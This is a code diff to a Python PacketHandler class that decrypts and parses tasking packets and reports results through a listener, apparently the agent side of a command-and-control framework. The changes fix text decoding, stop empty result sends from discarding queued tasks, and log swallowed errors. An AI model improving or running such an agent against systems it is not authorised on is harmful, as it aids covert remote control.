@@ -390,14 +390,8 @@ class PacketHandler:
             packetNum = struct.unpack("=H", packet[4 + offset:6 + offset])[0]
             resultID = struct.unpack("=H", packet[6 + offset:8 + offset])[0]
             length = struct.unpack("=L", packet[8 + offset:12 + offset])[0]
-            try:
-                packetData = packet.decode("UTF-8")[12 + offset:12 + offset + length]
-            except UnicodeDecodeError:
-                packetData = packet[12 + offset:12 + offset + length].decode("latin-1")
-            try:
-                remainingData = packet.decode("UTF-8")[12 + offset + length:]
-            except UnicodeDecodeError:
-                remainingData = packet[12 + offset + length:].decode("latin-1")
+            packetData = packet.decode("latin-1")[12 + offset:12 + offset + length]
+            remainingData = packet.decode("latin-1")[12 + offset + length:]
             return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
         except (struct.error, IndexError) as e:
             print("parse_task_packet exception:", e)
@@ -409,7 +403,7 @@ class PacketHandler:
         #   -extracts the packets and processes each
         try:
             # aes_decrypt_and_verify is in stager.py
-            tasking = aes_decrypt_and_verify(self.key, data).encode("UTF-8")
+            tasking = aes_decrypt_and_verify(self.key, data).encode("latin-1")
             (
                 packetType,
                 totalPacket,
@@ -444,8 +438,11 @@ class PacketHandler:
 
                 packetOffset += 12 + length
 
-            # send_message() is patched in from the listener module
-            self.send_message(resultPackets)
+            # send_message() is patched in from the listener module.
+            # Only send if there are accumulated results; an empty call
+            # triggers a GET that pulls (and discards) queued tasks.
+            if resultPackets:
+                self.send_message(resultPackets)
 
         except TagInvalidException as e:
             print("process_tasking: authentication failed:", e)
@@ -455,8 +452,8 @@ class PacketHandler:
             print("process_tasking: unexpected error:", e)
             try:
                 self.send_message(self.build_response_packet(0, str(e), 0))
-            except Exception:
-                pass
+            except Exception as inner_e:
+                print("process_tasking: failed to report error to server:", inner_e)
 
     def process_job_tasking(self, result):
         # process job data packets
@@ -466,7 +463,8 @@ class PacketHandler:
             resultPackets = b""
             if result:
                 resultPackets += result
-            # send packets
-            self.send_message(resultPackets)
+            # Only send if there are results to report
+            if resultPackets:
+                self.send_message(resultPackets)
         except Exception as e:
             print("processJobTasking exception:", e)
